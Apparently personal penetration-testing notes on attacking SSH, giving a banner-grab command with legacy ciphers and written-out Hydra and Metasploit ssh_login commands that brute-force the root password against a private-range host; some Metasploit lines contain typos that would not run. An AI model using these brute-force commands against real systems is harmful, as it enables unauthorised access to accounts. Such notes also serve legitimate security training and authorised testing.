# enumerating SSH

PROBABLY NOT USEABLE BUT TRY STUFF ANYWAYS...


Check ssh version and see if its vulnerable

```
ssh <ip> -oKexAlgorithms=+<algorithmgiven> -c <offered-cipher>
#example:
ssh <ip> -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
```
why do this? to check the banner


# BRUTE FORCE

## Hydra
Use Hydra to brute force

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.132.45:22 -t 4 -V
```

## metasploit

```
msf5 > search ssh
msf5 > use 17
msf5 auxiliary(scanner/ssh/ssh_login) > options
msf5 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.132
msf5 auxiliary(scanner/ssh/ssh_login) > set THREADS10
msf5 auxiliary(scanner/ssh/ssh_login) > set VERVOSE true
```
